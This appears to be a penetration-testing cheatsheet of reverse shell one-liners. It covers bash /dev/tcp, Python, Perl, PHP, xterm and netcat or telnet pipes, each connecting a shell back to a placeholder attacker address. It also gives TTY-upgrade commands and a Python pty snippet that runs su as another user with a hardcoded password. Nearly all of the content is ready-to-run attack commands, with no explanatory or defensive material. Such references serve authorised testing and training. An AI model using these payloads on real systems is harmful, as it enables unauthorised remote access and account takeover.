---
title: Reverse Shell Cheatsheet
date: 2024-1-1 
categories: [Notes, Pentest]
tags: [reverse shell,xterm,bash,python,php,netcat,perl,interactive,tty,shell]
comments: false
---

# Gaining Access

## Reverse Shell One-Liners

> Bash

```bash
bash -i >& /dev/tcp/<IP-address>/8080 0>&1
```

> Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-address>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> Perl

```bash
perl -e 'use Socket;$i="<IP-address>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

> PHP

```bash
php -r '$sock=fsockopen("<IP-address>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> XTerm

```bash
xterm -display <IP-address>:1
```

> Netcat without -e #1

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP-address> 1234 > /tmp/f
```

> Netcat without -e #2

```bash
nc localhost 443 | /bin/sh | nc localhost 444
```

```bash
telnet localhost 443 | /bin/sh | telnet localhost 444
```

## Interactive TTY Shells

```bash
/usr/bin/expect sh
```

```bash
python -c ‘import pty; pty.spawn(“/bin/sh”)’
```

> Execute one command with `su` as another user if you do not have access to the shell. Credit to g0blin.co.uk & Mantvydas Baranauskas

```bash
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```
